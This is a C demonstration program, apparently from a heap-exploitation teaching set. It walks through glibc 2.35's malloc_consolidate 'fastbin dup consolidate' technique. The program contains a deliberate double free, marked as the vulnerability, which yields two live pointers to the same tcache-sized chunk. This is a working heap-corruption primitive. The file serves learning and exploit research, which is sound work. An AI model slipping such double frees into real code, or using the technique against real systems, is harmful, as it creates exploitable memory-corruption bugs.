#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

/*
Original reference: https://valsamaras.medium.com/the-toddlers-introduction-to-heap-exploitation-fastbin-dup-consolidate-part-4-2-ce6d68136aa8

This document is mostly used to demonstrate malloc_consolidate and how it can be leveraged with a
double free to gain two pointers to the same large-sized chunk, which is usually difficult to do 
directly due to the previnuse check. Interestingly this also includes tcache-sized chunks of certain sizes.

malloc_consolidate(https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4714) essentially
merges all fastbin chunks with their neighbors, puts them in the unsorted bin and merges them with top
if possible.

As of glibc version 2.35 it is called only in the following five places:
1. _int_malloc: A large sized chunk is being allocated (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L3965)
2. _int_malloc: No bins were found for a chunk and top is too small (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4394)
3. _int_free: If the chunk size is >= FASTBIN_CONSOLIDATION_THRESHOLD (65536) (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4674)
4. mtrim: Always (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L5041)
5. __libc_mallopt: Always (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L5463)

We will be targeting the first place, so we will need to allocate a chunk that does not belong in the 
small bin (since we are trying to get into the 'else' branch of this check: https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L3901). 
This means our chunk will need to be of size >= 0x400 (it is thus large-sized). Notably, the 
biggest tcache sized chunk is 0x410, so if our chunk is in the [0x400, 0x410] range we can utilize 
a double free to gain control of a tcache sized chunk.   
*/

#define CHUNK_SIZE 0x400

int main() {
	printf("This technique will make use of malloc_consolidate and a double free to gain a duplication in the tcache.\n");
	printf("Lets prepare to fill up the tcache in order to force fastbin usage...\n\n");

	void *ptr[7];

	for(int i = 0; i < 7; i++)
		ptr[i] = malloc(0x40);

	void* p1 = malloc(0x40);
	printf("Allocate another chunk of the same size p1=%p \n", p1);

	printf("Fill up the tcache...\n");
	for(int i = 0; i < 7; i++)
		free(ptr[i]);

  	printf("Now freeing p1 will add it to the fastbin.\n\n");
  	free(p1);

	printf("To trigger malloc_consolidate we need to allocate a chunk with large chunk size (>= 0x400)\n");
	printf("which corresponds to request size >= 0x3f0. We will request 0x400 bytes, which will gives us\n");
	printf("a tcache-sized chunk with chunk size 0x410 ");
  	void* p2 = malloc(CHUNK_SIZE);

	printf("p2=%p.\n", p2);

	printf("\nFirst, malloc_consolidate will merge the fast chunk p1 with top.\n");
	printf("Then, p2 is allocated from top since there is no free chunk bigger (or equal) than it. Thus, p1 = p2.\n");

	assert(p1 == p2);

  	printf("We will double free p1, which now points to the 0x410 chunk we just allocated (p2).\n\n");
	free(p1); // vulnerability (double free)
	printf("It is now in the tcache (or merged with top if we had initially chosen a chunk size > 0x410).\n");

	printf("So p1 is double freed, and p2 hasn't been freed although it now points to a free chunk.\n");

	printf("We will request 0x400 bytes. This will give us the 0x410 chunk that's currently in\n");
	printf("the tcache bin. p2 and p1 will still be pointing to it.\n");
	void *p3 = malloc(CHUNK_SIZE);

	assert(p3 == p2);

	printf("We now have two pointers (p2 and p3) that haven't been directly freed\n");
	printf("and both point to the same tcache sized chunk. p2=%p p3=%p\n", p2, p3);
	printf("We have achieved duplication!\n\n");

	printf("Note: This duplication would have also worked with a larger chunk size, the chunks would\n");
	printf("have behaved the same, just being taken from the top instead of from the tcache bin.\n");
	printf("This is pretty cool because it is usually difficult to duplicate large sized chunks\n");
	printf("because they are resistant to direct double free's due to their PREV_INUSE check.\n");

	return 0;
}
